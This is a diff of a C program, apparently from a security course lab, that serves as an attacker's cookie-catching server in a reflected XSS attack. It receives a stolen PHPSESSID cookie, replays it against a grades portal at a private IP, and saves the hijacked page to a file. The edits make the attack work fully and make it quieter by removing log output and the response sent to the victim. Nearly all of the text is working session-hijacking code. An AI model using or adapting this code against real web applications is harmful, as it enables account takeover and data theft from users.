@@ -22,7 +22,7 @@
 #define WEB_PORT 80
 #define PORT 8888
 #define BUFFER_SIZE 8192
-#define WEB_IP "192.168.1.201"
+#define WEB_IP "192.168.1.203"
 #define OUTPUT_FILE "spoofed-reflected.txt"
 #define COOKIE_LEN 64
 
@@ -76,90 +76,27 @@ static int extract_sessid(const char *request,
   return 1;
 }
 
-///*
-// * extract_cookie - Extracts and prints cookie information from HTTP request
-// * @request: The raw HTTP request string
-// *
-// * Searches for the "Cookie:" header in the HTTP request and extracts
-// * session information if present.
-// */
-//static void extract_cookie(const char *request) {
-//    const char *cookie_line = strstr(request, "Cookie:");
-//    if (cookie_line == NULL) {
-//        cookie_line = strstr(request, "cookie:");
-//    }
-//
-//    if (cookie_line != NULL) {
-//        const char *line_end = strstr(cookie_line, "\r\n");
-//        if (line_end == NULL) {
-//            line_end = strstr(cookie_line, "\n");
-//        }
-//
-//        if (line_end != NULL) {
-//            size_t cookie_len = (size_t)(line_end - cookie_line);
-//            char *cookie = malloc(cookie_len + 1);
-//            if (cookie != NULL) {
-//                memcpy(cookie, cookie_line, cookie_len);
-//                cookie[cookie_len] = '\0';
-//                printf("Extracted: %s\n", cookie);
-//                free(cookie);
-//            }
-//        }
-//    }
-//}
-//
-
-/*
- * send_http_response - Sends a minimal HTTP 200 OK response
- * @client_fd: File descriptor of the connected client socket
- */
-static void send_http_response(int client_fd) {
-    const char *response = 
-        "HTTP/1.1 200 OK\r\n"
-        "Content-Type: text/html\r\n"
-        "Content-Length: 27\r\n"
-        "Connection: close\r\n"
-        "\r\n"
-        "<html>Request logged</html>";
-    
-    ssize_t sent = write(client_fd, response, strlen(response));
-    (void)sent;
-}
-/*
- * WRITE TO OUT FILE
- *  0-fail
- * 1-success
- */
-int write_to_out_file(const char* buffer){
-  FILE * output_file = fopen(OUTPUT_FILE, "w");
-  if (!output_file) {
-    return 0;
-  }
-  // todo maybe if is not needed
-  if (fprintf(output_file, "%s", buffer) < 0) {
-    fclose(output_file);
-    return 0;
-  }
-  fclose(output_file);
-  //TODO DELETE PRINT
-  printf("Request written to %s\n", OUTPUT_FILE);
-  return 1;
-}
 /*
  * RECV RESPONSE FROM WEB SERVER AND WRITES TO FILE
  * 0-fail
  * 1-success
  */
 static int recv_response_from_web(int web_fd){
-  char response_from_web[BUFFER_SIZE];
-  memset(response_from_web,0,BUFFER_SIZE);
-  ssize_t recv_len = read(web_fd, response_from_web, BUFFER_SIZE - 1);
-  if (recv_len <=0){
+	FILE * output_file = fopen(OUTPUT_FILE, "w");
+  if (!output_file) {
     return 0;
   }
-  response_from_web[recv_len] = '\0';
-  int res_write2file = write_to_out_file (response_from_web);
-  return res_write2file;
+  char response_from_web[BUFFER_SIZE];
+  memset(response_from_web,0,BUFFER_SIZE);
+	int recv_flg=0;
+	ssize_t recv_len;
+  while((recv_len = read(web_fd, response_from_web, BUFFER_SIZE - 1))>0){
+fwrite(response_from_web,1,(size_t)recv_len,output_file);
+memset(response_from_web,0,BUFFER_SIZE);
+recv_flg=1;
+}
+fclose(output_file);
+return recv_flg;
 }
 
 /*
@@ -171,9 +108,11 @@ static int recv_response_from_web(int web_fd){
 static int send_request_to_web(const char *cookie_id)
 {
   int web_fd = socket (AF_INET, SOCK_STREAM, 0);
-  if (web_fd < 0) return 0;
+  if (web_fd < 0) {
+	return 0;
+	}
 
-  struct sockaddr_in web_addr = {0};
+  struct sockaddr_in web_addr;
   web_addr.sin_family = AF_INET;
   web_addr.sin_port = htons (WEB_PORT);
 
@@ -192,7 +131,7 @@ static int send_request_to_web(const char *cookie_id)
   int len = snprintf (request, sizeof (request),
                       "GET /gradesPortal.php HTTP/1.1\r\n"
                       "Host: %s\r\n"
-                      "Cookie: %.*s\r\n"
+                      "Cookie: PHPSESSID=%.*s\r\n"
                       "Connection: close\r\n\r\n",
                       WEB_IP, COOKIE_LEN, cookie_id);
 
@@ -201,7 +140,7 @@ static int send_request_to_web(const char *cookie_id)
     return 0;
 }
 
-  if (send (web_fd, request, (size_t) len, 0) < 0){
+  if (send (web_fd, request, strlen(request), 0) < 0){
     close(web_fd);
     return 0;
 }
@@ -256,12 +195,10 @@ static int bind_and_listen(int server_fd)
   server_addr.sin_port = htons(PORT);
 
   if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-    perror("Bind failed");
     return 0;
   }
 
   if (listen(server_fd, 1) < 0) {
-    perror("Listen failed");
     return 0;
   }
   return 1;
@@ -293,20 +230,16 @@ int main(void) {
       close(server_fd);
       exit(EXIT_FAILURE);
     }
-    printf("Attacker's server listening on port %d...\n", PORT);
+//    printf("Attacker's server listening on port %d...\n", PORT);
 
     // ACCEPT CLIENT
     int client_fd = -1;
     struct sockaddr_in client_addr;
     client_fd = accept_client(server_fd, &client_addr);
     if (client_fd < 0){
-      perror("Accept failed");
       close(server_fd);
       exit(EXIT_FAILURE);
     }
-    printf("Connection received from %s:%d\n",
-         inet_ntoa(client_addr.sin_addr),
-         ntohs(client_addr.sin_port));
 
     // HANDLE CLIENT
     char buffer[BUFFER_SIZE];
@@ -315,41 +248,33 @@ int main(void) {
     memset(buffer, 0, BUFFER_SIZE);
     bytes_read = read(client_fd, buffer, BUFFER_SIZE - 1);
     if (bytes_read < 0) {
-        perror("Read failed");
         close(client_fd);
         close(server_fd);
         exit(EXIT_FAILURE);
     }
     buffer[bytes_read] = '\0';
-    printf("Request captured (%zd bytes)\n", bytes_read);
 
 //    extract_cookie(buffer);
 
     // EXTRACT PHDSESSID FROM STOLEN COOKIE
     char sessid[256];
     memset(sessid, 0, sizeof(sessid));
-    if (extract_sessid(buffer, sessid, sizeof(sessid))) {
-        printf("PHPSESSID stored: %s\n", sessid);
-    } else {
-        printf("PHPSESSID not found in request\n");
+    if (!extract_sessid(buffer, sessid, sizeof(sessid))) {
+      close(client_fd);
+      close(server_fd);
+      exit(EXIT_FAILURE);
     }
-
-    // SEND RESPONSE TO CLIENT
-    send_http_response(client_fd);
 
     // SEND REQUEST TO WEB AND SAVE RESPONSE TO OUT FILE
     if (send_request_to_web(sessid)!=1){
 
         close(client_fd);
         close(server_fd);
-        printf ("Failed to send request to web");
         exit(EXIT_FAILURE);
     }
 
     // TERMINATE
     close(client_fd);
     close(server_fd);
-    printf("Server shutting down gracefully.\n");
-
     exit (EXIT_SUCCESS);
 }
